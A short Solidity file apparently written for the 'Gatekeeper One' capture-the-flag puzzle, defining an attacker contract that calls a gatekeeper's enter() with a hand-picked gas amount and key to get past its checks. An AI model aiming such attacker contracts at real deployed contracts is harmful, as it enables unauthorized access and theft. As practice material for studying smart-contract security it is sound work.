// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IGatekeeper {

  function enter(bytes8 _gateKey) external returns (bool);

}
contract GatekeeperOneAttacker {

  IGatekeeper gk;

  constructor(address _gk) public {
    gk = IGatekeeper(_gk);
  }


  function execute() external {
    gk.enter{gas: 8439}('12');
  }

}